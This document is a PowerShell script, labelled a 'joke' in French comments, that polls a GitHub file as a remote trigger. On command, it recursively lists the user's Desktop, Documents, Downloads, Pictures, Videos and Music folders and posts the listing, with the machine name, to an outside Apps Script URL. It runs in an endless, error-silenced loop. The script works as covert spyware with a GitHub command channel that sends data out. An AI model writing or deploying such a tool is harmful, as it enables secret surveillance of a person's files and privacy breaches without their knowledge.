# blague_listing_windows.ps1
# Surveille GitHub. Quand list_files=true -> genere la liste des fichiers -> envoie au Apps Script.

$ConfigFile = Join-Path $PSScriptRoot "blague_config.json"
$config     = Get-Content $ConfigFile -Raw | ConvertFrom-Json

$headers = @{
    Authorization = "Bearer $($config.token)"
    Accept        = "application/vnd.github+json"
    "User-Agent"  = "PowerShell"
}

function Get-ListingSignal {
    try {
        $url  = "https://api.github.com/repos/$($config.owner)/$($config.repo)/contents/data/blague_listing.json?ref=$($config.branch)"
        $resp = Invoke-RestMethod -Uri $url -Headers $headers -ErrorAction Stop
        $json = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($resp.content -replace "\s","")))
        $data = $json | ConvertFrom-Json
        return @{ list_files = [bool]$data.list_files; sha = $resp.sha }
    } catch { return $null }
}

function Reset-ListingSignal($sha) {
    try {
        $body = @{
            message = "reset listing signal"
            content = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{"list_files":false}'))
            sha     = $sha
            branch  = $config.branch
        } | ConvertTo-Json
        $url = "https://api.github.com/repos/$($config.owner)/$($config.repo)/contents/data/blague_listing.json"
        Invoke-RestMethod -Uri $url -Method Put -Headers $headers -Body $body -ContentType "application/json" | Out-Null
    } catch {}
}

function Send-FileListing {
    $dossiers = @(
        [Environment]::GetFolderPath('Desktop'),
        [Environment]::GetFolderPath('MyDocuments'),
        [Environment]::GetFolderPath('UserProfile') + '\Downloads',
        [Environment]::GetFolderPath('MyPictures'),
        [Environment]::GetFolderPath('MyVideos'),
        [Environment]::GetFolderPath('MyMusic')
    )

    $listing = foreach ($dossier in $dossiers) {
        if (-not (Test-Path $dossier)) { continue }
        Get-ChildItem -Path $dossier -Recurse -ErrorAction SilentlyContinue |
            Select-Object @{n='dossier';e={$dossier}},
                          @{n='chemin';e={$_.FullName.Replace($dossier, '').TrimStart('\/')}},
                          @{n='taille_ko';e={if ($_.PSIsContainer) { $null } else { [math]::Round($_.Length/1KB, 1) }}},
                          @{n='modifie';e={$_.LastWriteTime.ToString('yyyy-MM-dd HH:mm')}},
                          @{n='est_dossier';e={$_.PSIsContainer}}
    }

    $body = @{
        type    = 'listing'
        machine = $env:COMPUTERNAME
        date    = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
        fichiers = @($listing)
    } | ConvertTo-Json -Depth 5 -Compress

    try {
        Invoke-RestMethod -Uri $config.webapp_url -Method Post -Body $body -ContentType "application/json" | Out-Null
    } catch {}
}

# Boucle principale
while ($true) {
    $signal = Get-ListingSignal
    if ($signal -and $signal.list_files) {
        Reset-ListingSignal $signal.sha
        Send-FileListing
    }
    Start-Sleep -Seconds 3
}
